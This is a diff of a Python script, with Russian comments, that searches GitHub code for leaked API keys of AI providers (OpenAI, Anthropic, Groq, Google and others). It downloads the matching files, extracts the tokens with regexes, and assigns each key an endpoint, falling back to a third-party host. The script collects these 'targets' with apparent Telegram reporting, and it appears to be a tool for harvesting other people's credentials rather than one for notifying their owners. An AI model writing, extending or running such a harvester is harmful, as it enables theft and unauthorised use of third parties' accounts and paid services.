@@ -22,21 +22,27 @@ CHAT_ID = os.getenv("CHAT_ID")
 TOTAL_RUN_TIME = 3600
 REPORT_INTERVAL = 900
 
-# Паттерны ключей
+# ─── ПАТТЕРНЫ КЛЮЧЕЙ ───────────────────────────────────────────────────────
 KEY_PATTERNS = [
     {"provider": "openai",      "regex": re.compile(r"\bsk-proj-[A-Za-z0-9_-]{20,}\b")},
     {"provider": "anthropic",   "regex": re.compile(r"\bsk-ant-(?:api\d{2}-)?[A-Za-z0-9_-]{20,}\b")},
     {"provider": "kimi",        "regex": re.compile(r"\bsk-kimi-[A-Za-z0-9_-]{20,}\b")},
     {"provider": "minimax",     "regex": re.compile(r"\bsk-cp-[A-Za-z0-9_-]{20,}\b")},
     {"provider": "qwen",        "regex": re.compile(r"\bsk-sp-[A-Za-z0-9_-]{20,}\b")},
+    {"provider": "openrouter",  "regex": re.compile(r"\bsk-or-v1-[a-f0-9]{64}\b")},
     {"provider": "deepseek",    "regex": re.compile(r"\bsk-[a-f0-9]{32}\b")},
     {"provider": "zhipu",       "regex": re.compile(r"\b[a-f0-9]{32}\.[A-Za-z0-9]{16}\b")},
     {"provider": "huggingface", "regex": re.compile(r"\bhf_[A-Za-z]{34}\b")},
+    {"provider": "groq",        "regex": re.compile(r"\bgsk_[A-Za-z0-9]{52}\b")},
+    {"provider": "perplexity",  "regex": re.compile(r"\bpplx-[A-Za-z0-9]{48}\b")},
+    {"provider": "google",      "regex": re.compile(r"\bAIzaSy[A-Za-z0-9_-]{33}\b")},
+    {"provider": "replicate",   "regex": re.compile(r"\br8_[A-Za-z0-9]{37}\b")},
     {"provider": "generic-sk",  "regex": re.compile(r"\bsk-[A-Za-z0-9_-]{32,}\b")},
 ]
 
 URL_REGEX = re.compile(r'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?:/[a-zA-Z0-9._-]*)*(?:/v1)?')
 
+# ─── ЭНДПОИНТЫ ─────────────────────────────────────────────────────────────
 PROVIDER_ENDPOINTS = {
     "openai": "https://api.openai.com/v1",
     "anthropic": "https://api.anthropic.com/v1",
@@ -45,6 +51,11 @@ PROVIDER_ENDPOINTS = {
     "qwen": "https://dashscope.aliyuncs.com/compatible-mode/v1",
     "deepseek": "https://api.deepseek.com/v1",
     "huggingface": "https://api-inference.huggingface.co",
+    "openrouter": "https://openrouter.ai/api/v1",
+    "groq": "https://api.groq.com/openai/v1",
+    "perplexity": "https://api.perplexity.ai",
+    "google": "https://generativelanguage.googleapis.com/v1beta",
+    "replicate": "https://api.replicate.com/v1",
     "generic-sk": "https://chat.kxsb.org/api/v1",
     "default": "https://chat.kxsb.org/api/v1"
 }
@@ -102,11 +113,13 @@ def fetch_github_targets():
     logger.info("🐙 Ищу ключи на GitHub...")
     headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
     
+    # Кавычки отсекают мусор вроде "task-"
     queries = [
         "sk-proj- language:Python", "sk-ant-api03- language:Python", 
         "sk-kimi- language:Python", "sk-cp- language:Python",
-        "sk-sp- language:Python", "hf_ language:Python", 
-        "sk- language:JSON", "sk- language:YAML", "sk- language:JavaScript"
+        "sk-sp- language:Python", "hf_ language:Python",
+        "\"gsk_\" language:Python", "\"pplx-\" language:Python", "\"AIzaSy\" language:Python",
+        "\"sk-\" language:JSON", "\"sk-\" language:YAML", "\"sk-\" language:JavaScript"
     ]
     query = random.choice(queries)
     page = random.randint(1, 10) 
@@ -122,17 +135,15 @@ def fetch_github_targets():
         logger.info(f"📄 Найдено файлов на странице {page}: {len(items)}")
         
         targets = []
-        for i, item in enumerate(items[:20], 1): # Ограничили 20 файлами
+        for i, item in enumerate(items[:20], 1):
             repo, path = item["repository"]["full_name"], item["path"]
             logger.info(f"   └ [{i}/{min(len(items), 20)}] Скачиваю {repo}...")
             
             try:
                 file_resp = requests.get(f"https://api.github.com/repos/{repo}/contents/{path}", headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=5)
                 if file_resp.status_code != 200:
-                    logger.info(f"      ⚠️ Не удалось скачать (код {file_resp.status_code})")
                     continue
-            except requests.RequestException as e:
-                logger.info(f"      ⚠️ Таймаут при скачивании: {e}")
+            except requests.RequestException:
                 continue
                 
             lines = file_resp.text.split('\n')
@@ -140,21 +151,29 @@ def fetch_github_targets():
                 for p in KEY_PATTERNS:
                     for match in p["regex"].finditer(line):
                         token = match.group(0)
+                        
+                        # Защита от дубликатов: generic-sk не берет официальные префиксы
+                        if p["provider"] == "generic-sk":
+                            if any(token.startswith(prefix) for prefix in ["sk-proj-", "sk-ant-", "sk-kimi-", "sk-cp-", "sk-sp-", "sk-or-v1-"]):
+                                continue
+                                
                         api_urls = []
                         
+                        # ПРИОРИТЕТ 1: URL в этой же строке
                         for u in URL_REGEX.findall(line):
                             if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png']): continue
                             match_url = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
                             if match_url: api_urls.append(match_url.group(1))
                         
+                        # ПРИОРИТЕТ 2: Префикс ключа
                         if not api_urls and p["provider"] != "generic-sk":
                             api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"]))
                         
+                        # ПРИОРИТЕТ 3: Конфиги репо (Trees API)
                         if not api_urls:
-                            # Добавили лог для Trees API, так как он тоже может тупить
-                            logger.info(f"      🔍 Ищу эндпоинт в конфигах для {token[:8]}...")
                             api_urls.extend(get_urls_from_repo_configs(repo)[:1])
                         
+                        # ПРИОРИТЕТ 4: Переменная
                         if not api_urls:
                             var_match = re.search(r'([A-Za-z0-9_]+)\s*=', line)
                             var_name = var_match.group(1).lower() if var_match else ""
@@ -164,11 +183,13 @@ def fetch_github_targets():
                                 if "openai" in var_name: api_urls.append(PROVIDER_ENDPOINTS["openai"])
                                 elif "anthropic" in var_name: api_urls.append(PROVIDER_ENDPOINTS["anthropic"])
                         
+                        # ПРИОРИТЕТ 5: Имя репо
                         if not api_urls:
                             combined = (repo + " " + path).lower()
                             for hint, url in REPO_HINTS.items():
                                 if hint in combined: api_urls.append(url); break
                                 
+                        # ПРИОРИТЕТ 6: Дефолт
                         if not api_urls:
                             api_urls.append(PROVIDER_ENDPOINTS["default"])
                             
@@ -181,7 +202,7 @@ def fetch_github_targets():
             sig = f"{t['key']}_{t['endpoint']}"
             if sig not in seen: seen.add(sig); unique_targets.append(t)
             
-        logger.info(f"✅ Парсинг завершен. Найдено уникальных целей: {len(unique_targets)}")
+        logger.info(f"✅ Парсинг завершен. Найдено целей: {len(unique_targets)}")
         return unique_targets
     except Exception as e:
         logger.error(f"❌ Ошибка GitHub: {e}")
